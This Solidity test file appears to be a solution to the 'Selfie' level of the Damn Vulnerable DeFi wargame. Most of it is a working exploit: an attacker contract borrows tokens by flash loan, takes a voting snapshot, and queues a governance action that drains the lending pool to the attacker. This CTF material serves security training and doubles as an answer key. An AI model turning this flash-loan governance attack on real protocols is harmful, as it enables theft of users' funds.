// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */

        AttackerContract attackerContract = new AttackerContract(simpleGovernance, selfiePool, address(attacker));

        attackerContract.attack(TOKENS_IN_POOL);

        vm.warp(block.timestamp + 2.1 days);

        simpleGovernance.executeAction(1);

        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}




contract AttackerContract {

    bool exploit = false;

    SimpleGovernance immutable governor;
    SelfiePool immutable lender;

    address immutable attacker;

    constructor (SimpleGovernance _governor, SelfiePool _lender, address _attacker) {
        lender = _lender;
        governor = _governor;
        attacker = _attacker;
    }

    /**
        @param amount flashloan to request
     */
    function attack(uint256 amount) external {
        lender.flashLoan(amount);
    }

    /**
        call back function for flashloan receiver this function is called when ever a user takes a flashLoan
     */
    function receiveTokens(address token, uint256 amount) external {

        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)", attacker);

        DamnValuableTokenSnapshot(token).snapshot();

        DamnValuableTokenSnapshot(token).transfer(address(lender), amount);

        governor.queueAction(address(lender), data, 0);

    }

}